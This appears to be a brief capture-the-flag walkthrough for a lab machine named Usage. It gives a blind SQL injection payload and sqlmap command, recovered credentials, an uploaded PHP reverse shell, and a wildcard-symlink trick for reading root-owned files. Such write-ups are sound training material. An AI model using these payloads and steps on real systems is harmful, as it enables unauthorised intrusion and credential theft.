## Linux Machine Usage

--[+] :  Target IP :

      >> 10.10.11.18
     
## Recon 
--[1] : Nmap
```nmap
		PORT   STATE SERVICE
		22/tcp open  ssh
		80/tcp open  http
```
	>> Port 80 appears to be running laravel
	
--[2] :  Gobuster 
      >> http://usage.htb/ 503 and 404 only 

--[3] :  Page subdomains :

      >> http://admin.usage.htb/

## Foothold
--[+] :  Blind sql injection on http://usage.htb/forget-password  :
      >> payload : ' AND 1=1;-- -
      >> sqlmap -r req.txt --risk=3 --level=5 --batch --dbms=mysql --dbs

available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog

      
      dump is fucked up lets see another time ... maybe machine down 
      
      //15-06-2024 -> completing the machine 
## admin.usage.htb    
- [1] : Credentials
   >>	admin:whatever1
      
## user dash 

- [1] : Php revershell through image
  >>	Go to settings and snuggle a revshell , bypass it with burpsuite 

## user xander
      in .monitrc
      admin:3nc0d3d_pa$$w0rd
## root
- [1] : sudo -l
  >>	/usr/bin/usage_management 
  >>	source (https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)
		touch @root.txt
		ln -s /file/you/want/to/read root.txt
       

